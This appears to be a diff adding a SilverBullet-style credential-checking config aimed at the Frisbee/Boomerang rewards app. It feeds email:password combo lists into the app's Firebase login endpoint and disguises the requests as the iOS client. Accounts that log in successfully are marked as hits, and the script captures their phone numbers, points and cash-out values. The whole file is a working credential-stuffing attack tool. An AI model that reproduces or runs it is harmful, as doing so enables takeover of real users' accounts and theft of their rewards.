@@ -1,0 +1,160 @@
+[SETTINGS]
+{
+  "Name": "FRISBEE REWARDS",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2023-12-29T03:05:16.101626+04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "🔥 @svbconfigmaker 🔥",
+  "Version": "1.1.3 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "Default",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "FRISBEE REWARDS",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+REQUEST POST "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCeVVQginhGTEynCOTn9b7BzJjiE8TfVt0" 
+  CONTENT "{\"email\":\"<USER>\",\"returnSecureToken\":true,\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.googleapis.com" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept: */*" 
+  HEADER "X-Client-Version: iOS/FirebaseSDK/10.10.0/FirebaseCore-iOS" 
+  HEADER "X-Firebase-Appcheck: eyJlcnJvciI6IlVOS05PV05fRVJST1IifQ==" 
+  HEADER "X-Ios-Bundle-Identifier: io.attaindata.boomerang" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en" 
+  HEADER "Content-Length: 84" 
+  HEADER "User-Agent: FirebaseAuth.iOS/10.10.0 io.attaindata.boomerang/2023.12.18 iPhone/17.2.1 hw/iPhone13_3" 
+  HEADER "X-Firebase-Gmpid: 1:190898141749:ios:f07ebe56fb8e1b8da2cf7c" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "EMAIL_NOT_FOUND" 
+    KEY "code\": 400," 
+    KEY "INVALID_PASSWORD" 
+  KEYCHAIN Success OR 
+    KEY "idToken" 
+    KEY "refreshToken" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\"registered\": false," 
+
+PARSE "<SOURCE>" LR "\"idToken\": \"" "\"" -> VAR "TK" 
+
+PARSE "<SOURCE>" LR "\"refreshToken\": \"" "\"" -> VAR "RTK" 
+
+REQUEST POST "https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key=AIzaSyCeVVQginhGTEynCOTn9b7BzJjiE8TfVt0" 
+  CONTENT "{\"idToken\":\"<TK>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.googleapis.com" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept: */*" 
+  HEADER "X-Client-Version: iOS/FirebaseSDK/10.10.0/FirebaseCore-iOS" 
+  HEADER "X-Firebase-Appcheck: eyJlcnJvciI6IlVOS05PV05fRVJST1IifQ==" 
+  HEADER "X-Ios-Bundle-Identifier: io.attaindata.boomerang" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en" 
+  HEADER "Content-Length: 1094" 
+  HEADER "User-Agent: FirebaseAuth.iOS/10.10.0 io.attaindata.boomerang/2023.12.18 iPhone/17.2.1 hw/iPhone13_3" 
+  HEADER "X-Firebase-Gmpid: 1:190898141749:ios:f07ebe56fb8e1b8da2cf7c" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "localId" 
+    KEY "createdAt" 
+    KEY "lastLoginAt" 
+
+PARSE "<SOURCE>" LR "\"emailVerified\": " "," CreateEmpty=FALSE -> CAP "emailVerified" 
+
+PARSE "<SOURCE>" LR "\"phoneNumber\": \"" "\"" CreateEmpty=FALSE -> CAP "phoneNumber" 
+
+REQUEST POST "https://api.boomerangrewards.io/graphql" 
+  CONTENT "{\"operationName\":\"MyPoints\",\"query\":\"query MyPoints {  myPoints {    __typename    amount    id  }}\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api.boomerangrewards.io" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept: */*" 
+  HEADER "Apollographql-Client-Version: 2023.12.18" 
+  HEADER "Authorization: Bearer <TK>" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-GB,en;q=0.9" 
+  HEADER "Apollographql-App-Name: boomerang" 
+  HEADER "Content-Length: 113" 
+  HEADER "X-Apollo-Operation-Type: query" 
+  HEADER "User-Agent: Frisbee/320 CFNetwork/1490.0.4 Darwin/23.2.0" 
+  HEADER "Apollographql-Client-Name: ios" 
+  HEADER "X-Apollo-Operation-Name: MyPoints" 
+
+PARSE "<SOURCE>" LR "\"amount\":" "," CreateEmpty=FALSE -> CAP "Points" 
+
+REQUEST POST "https://api.boomerangrewards.io/graphql/Dashboard" 
+  CONTENT "{\"operationName\":\"Dashboard\",\"variables\":{},\"query\":\"query Dashboard { dashboard { id boomerangTracker { title receiptsSubmitted boomerangs tier1 { __typename ...BoomerangTierDescription } tier2 { __typename ...BoomerangTierDescription } tier3 { __typename ...BoomerangTierDescription } tier4 { __typename ...BoomerangTierDescription } } myPoints { id amount } cashoutValue areInitialDemographicQuestionsCompleted demographicQuestionsPoints browserExtensionInstallCta referralDetails { title description code points shareCopy shareLink steps { id title } } linkPlaidAccount { title description cta points } browserExtensionInstall { title description cta points } linkEmailAccount { title description cta points interstitial { title description } platform } pointsChallenge { id banner { title backgroundColor } image { url } info details { __typename ... on ChallengeDetailsAccepted { claimed { id value title } currentSteps maxSteps } ... on ChallengeDetailsNotAccepted { claimed { id value title } cta } ... on ChallengeDetailsCompleted { challengePoints regularPoints } ... on ChallengeDetailsNotCompleted { regularPoints } } placement message } } }  fragment BoomerangTierDescription on BoomerangTierDescription { title points }\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api.boomerangrewards.io" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept: multipart/mixed; deferSpec=20220824, application/json" 
+  HEADER "Apollographql-Client-Version: 2023.12.18" 
+  HEADER "Authorization: Bearer <TK>" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-GB,en;q=0.9" 
+  HEADER "X-Apollo-Operation-Id: 7e209f4d942a6c7134a96d06ee4c729b1ce0e5345c51d3f949f61950c2b019b8" 
+  HEADER "Content-Length: 1235" 
+  HEADER "User-Agent: Frisbee/320 CFNetwork/1490.0.4 Darwin/23.2.0" 
+  HEADER "Apollographql-Client-Name: ios" 
+  HEADER "Timezone: 240" 
+  HEADER "X-Apollo-Operation-Name: Dashboard" 
+
+PARSE "<SOURCE>" JSON "cashoutValue" CreateEmpty=FALSE -> CAP "cashoutValue" 
+
+FUNCTION Constant "🔥 @svbconfigmaker 🔥" -> CAP "Config By " 
+
